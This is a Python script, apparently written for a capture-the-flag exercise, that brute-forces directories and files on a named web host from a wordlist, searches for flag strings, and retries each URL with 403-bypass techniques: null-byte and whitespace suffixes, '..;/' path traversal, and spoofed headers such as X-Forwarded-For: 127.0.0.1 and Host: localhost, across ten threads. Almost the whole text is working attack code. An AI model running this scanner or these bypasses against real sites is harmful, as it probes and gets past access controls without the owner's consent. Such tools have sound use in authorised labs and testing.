import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import time


def load_wordlist(filename):
    """Load wordlist from file"""
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]


def setup_session():
    """Setup HTTP session with proper headers"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    })
    return session


def check_url_with_bypass(session, url, path_type=""):
    """Check URL with various bypass techniques for 403 errors"""
    bypass_techniques = [
        url,  # Original URL
        f"{url}%20",  # URL with space
        f"{url}%09",  # URL with tab
        f"{url}%00",  # URL with null byte
        f"{url}..;/",  # Path traversal attempt
        f"{url}/..",  # Another path traversal
        f"{url}/.",  # Current directory reference
    ]

    bypass_headers = [
        {},  # Default headers
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Cluster-Client-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'Host': 'localhost'},
    ]

    results = []

    for test_url in bypass_techniques:
        for headers in bypass_headers:
            try:

                original_headers = session.headers.copy()
                session.headers.update(headers)

                resp = session.get(test_url, timeout=10, allow_redirects=True)

                session.headers = original_headers

                if resp.status_code == 200:
                    content = resp.text.strip()
                    print(f"[{resp.status_code}] {path_type} {test_url} (bypass worked!)")

                    if content and len(content) < 2000:
                        print(f"    Content ({len(content)} chars): {content[:200]}")
                        if any(flag in content.lower() for flag in ['flag{', 'ctf{', 'py10{', 'hackthebox{']):
                            print(f"🚩🚩🚩 FLAG FOUND: {content}")
                            return resp.status_code

                    results.append((resp.status_code, test_url, content))

                elif resp.status_code in [301, 302]:
                    location = resp.headers.get('Location', '')
                    print(f"[{resp.status_code}] {path_type} {test_url} -> {location}")

            except Exception as e:
                continue

    return None if not results else results[0][0]


def comprehensive_scan():
    """Perform comprehensive directory and file scanning"""
    base_url = "https://py10-day6-577570284557.europe-west1.run.app/ex2"
    words = load_wordlist("httpwalk-dict.txt")
    session = setup_session()

    print(f"Starting comprehensive scan: {base_url}")
    print(f"Wordlist loaded: {len(words)} words")
    print("Words:", words)

    known_paths = [
        "/backup",
        "/backup/code",
        "/backup/old",
        "/backup/code/last",
        "/backup/old/previous"
    ]

    extensions = ['', '.txt', '.flag', '.php', '.html', '.htm', '.log', '.bak', '.old', '.tmp', '.backup']

    flag_names = [
        'flag', 'FLAG', 'flag.txt', 'Flag.txt', 'FLAG.txt',
        'secret', 'secret.txt', 'key', 'key.txt',
        'answer', 'answer.txt', 'solution', 'solution.txt',
        'token', 'token.txt', 'pass', 'password', 'pwd'
    ]

    all_urls = []

    print("\n=== Scanning known paths ===")
    for path in known_paths:
        for word in words:
            for ext in extensions:
                all_urls.append(f"{base_url}{path}/{word}{ext}")

        for flag_name in flag_names:
            all_urls.append(f"{base_url}{path}/{flag_name}")

    print("\n=== Scanning deeper combinations ===")
    for w1 in words:
        for w2 in words:
            for w3 in words:
                test_paths = [
                    f"{base_url}/backup/{w1}/{w2}/{w3}.txt",
                    f"{base_url}/backup/old/{w1}/{w2}.txt",
                    f"{base_url}/backup/code/{w1}/{w2}.txt",
                    f"{base_url}/backup/old/previous/{w1}.txt",
                    f"{base_url}/backup/code/last/{w1}.txt",
                ]
                all_urls.extend(test_paths)

    print("\n=== Scanning index and common files ===")
    common_files = ['index.html', 'index.php', 'index.txt', 'default.html', 'home.html']
    for path in known_paths:
        for file in common_files:
            all_urls.append(f"{base_url}{path}/{file}")

    all_urls = list(set(all_urls))
    print(f"Total URLs to check: {len(all_urls)}")

    def scan_url(url):
        return check_url_with_bypass(session, url, "SCAN")

    print("\n=== Starting URL scan ===")
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(scan_url, all_urls))

    print("\n=== Manual specific attempts ===")
    specific_attempts = [
        f"{base_url}/backup/old/previous/flag.txt",
        f"{base_url}/backup/code/last/flag.txt",
        f"{base_url}/backup/old/previous/src.txt",
        f"{base_url}/backup/code/last/source.txt",
        f"{base_url}/backup/old/previous/website.txt",
        f"{base_url}/backup/code/last/static.txt",
    ]

    for url in specific_attempts:
        print(f"Trying specific: {url}")
        check_url_with_bypass(session, url, "MANUAL")
        time.sleep(0.5)  # Small delay

    print("\n=== Scan completed ===")


if __name__ == "__main__":
    comprehensive_scan()
